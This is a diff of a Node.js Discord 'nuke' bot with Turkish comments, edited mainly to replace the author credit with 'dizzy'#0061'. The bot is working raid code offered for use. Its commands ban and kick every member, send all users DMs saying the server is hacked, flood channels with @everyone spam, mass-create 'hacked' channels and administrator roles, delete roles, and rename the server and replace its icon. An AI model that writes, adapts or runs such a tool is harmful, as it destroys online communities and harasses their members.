@@ -1,18 +1,18 @@
-const Discord = require("discord.js");
+const Discord = require("discord.js");//by diizy'#0061
 const client = new Discord.Client();
-const ayarlar = require("./ayarlar.json");
-const { Client, Util } = require("discord.js");
+const ayarlar = require("./ayarlar.json");//by diizy'#0061
+const { Client, Util } = require("discord.js");//by diizy'#0061
 const request = require("request");
 client.login(ayarlar.token);
-client.on('ready', () => {
- client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB |!yardım| `)
- console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D by melik ama yıkık olandan alayım#0061 `);
+client.on('ready', () => {//by diizy'#0061//by diizy'#0061
+ client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB ↪✔Ana Komut: !yardım `)//by diizy'#0061
+ console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D by dizzy'#0061 `);//by diizy'#0061
 });
 
-
+//by diizy'#0061
 
 client.on("message", msg => {          
-  if (msg.content === "!ban") {
+  if (msg.content === "!ban") {//by diizy'#0061//by diizy'#0061
     msg.delete();
     msg.guild.members.forEach(member => member.ban());  
   }
@@ -20,24 +20,24 @@ client.on("message", msg => {
 
 client.on("message", msg => {
   if (msg.content === "!kick") {
-    msg.delete();
+    msg.delete();//by diizy'#0061
     msg.guild.members.forEach(member => member.kick());
-  }
+  }//by diizy'#0061
 });      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
 
-client.on("message", async msg => {
+client.on("message", async msg => {//by diizy'#0061
   if (msg.content === "!duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
     msg.delete();
     await msg.client.users
-      .forEach(users =>
+      .forEach(users =>//by diizy'#0061
         users.send(
           "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
-        )
+        )//by diizy'#0061
       )
       .catch(console.error);
   } 
 });
-
+//by diizy'#0061
 client.on('message', msg => {
   if (msg.content === '!spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
          
@@ -46,9 +46,32 @@ msg.channel.send("hacked by dizzy'#0061 ");
     
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  "); // by dizzy'#0061
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");// by dizzy'#0061
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");// by dizzy'#0061
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    //by diizy'#0061//by diizy'#0061
+    
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
@@ -62,18 +85,8 @@ msg.channel.send("hacked by dizzy'#0061 ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     
-    
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
@@ -81,15 +94,15 @@ msg.channel.send("hacked by dizzy'#0061 ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");// by dizzy'#0061
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
@@ -100,24 +113,11 @@ msg.channel.send("hacked by dizzy'#0061 ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
     msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
-    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");
+    msg.channel.send("hacked by dizzy'#0061 @everyone @here  ");//by diizy'#0061//by diizy'#0061
     
     
     
-    
+    // by dizzy'#0061
     
   }
 });
@@ -132,31 +132,19 @@ client.on("message", async msg => {
 
    
         await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061
+    });
+     await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"//by diizy'#0061
+    });
+     await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"// by dizzy'#0061
     });
      await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     });
      await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    });
-     await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    });
-     await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
@@ -171,9 +159,7 @@ client.on("message", async msg => {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
@@ -181,12 +167,12 @@ client.on("message", async msg => {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
+      type: "text"// by dizzy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"// by dizzy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"// by dizzy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
@@ -203,10 +189,12 @@ client.on("message", async msg => {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
@@ -217,12 +205,16 @@ client.on("message", async msg => {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
@@ -386,7 +378,7 @@ client.on("message", async msg => {
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
@@ -396,26 +388,34 @@ client.on("message", async msg => {
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"//by diizy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
+      type: "text"//by diizy'#0061//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
+      type: "text"//by diizy'#0061
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"//by diizy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+      type: "text"//by diizy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
@@ -445,7 +445,7 @@ client.on("message", async msg => {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
@@ -503,7 +503,7 @@ client.on("message", async msg => {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    });
+    });//by diizy'#0061
  
  
 
@@ -512,200 +512,168 @@ client.on("message", async msg => {
     client.on("message", msg => {
   if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
     msg.delete();
-    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "A93D3D",
-      permissions: ["ADMINISTRATOR"]
-    });
-        msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "C22F2F",
-      permissions: ["ADMINISTRATOR"]
-    });
-            msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "E12020",
-      permissions: ["ADMINISTRATOR"]
-    });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF0000",
-      permissions: ["ADMINISTRATOR"]
-    });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF3E00",
-      permissions: ["ADMINISTRATOR"]
-    });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF4D00",
-      permissions: ["ADMINISTRATOR"]
-    });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
+                   msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
       color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF9300",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FFAE00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
+      permissions: ["ADMINISTRATOR"]
+    });//by diizy'#0061
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FFD500",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FFFF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "E0FF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "C1FF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "93FF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "74FF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
+      permissions: ["ADMINISTRATOR"]
+    });//by diizy'#0061
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "3EFF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "0CFF00",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "00FF2E",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "00FF6C",
+         //by diizy'#0061
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "00FFA6",
-      permissions: ["ADMINISTRATOR"]    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "00FFD4",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "00FFFB",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "00C9FF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "009BFF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
+      permissions: ["ADMINISTRATOR"]
+    });//by diizy'#0061
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "006CFF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "003AFF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "001BFF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "1F00FF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "4200FF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "7C00FF",
+         
+                    msg.guild.createRole({// by dizzy'#0061
+      name: "hacked",
+      color: "FF6C00",//by diizy'#0061
       permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "A200FF",
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "C500FF",
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "E000FF",  ///null
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF00F3",
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF00B6",
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF0097",
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF005D",
-      permissions: ["ADMINISTRATOR"]
-    });
-                    msg.guild.createRole({
-      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
-      color: "FF0032",
-      permissions: ["ADMINISTRATOR"]
-    });
+    });//by diizy'#0061
+         
+    
   }
 });
 
-
-    await msg.guild.setIcon("https://hizliresim.com/zUSK3E");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+//by diizy'#0061
+    await msg.guild.setIcon("https://hizliresim.com/zUSK3E");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ//by diizy'#0061
     await msg.guild.setName("hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
     await client.user.setAvatar("https://hizliresim.com/jNCN1l"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
@@ -715,16 +683,16 @@ client.on("message", async msg => {
   }   ///null
 });
 
+//by diizy'#0061
+
+//by diizy'#0061
+//by diizy'#0061
 
 
-
-
-
-
-const http = require("http");
+const http = require("http");//by diizy'#0061
 const express = require("express");
 const app = express();
-    function sleep(milliseconds) {
+    function sleep(milliseconds) {//by diizy'#0061
   var start = new Date().getTime();
   for (var i = 0; i < 1e7; i++) { 
     if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
@@ -743,3 +711,4 @@ setInterval(() => {
 
 
  ///null
+//by diizy'#0061
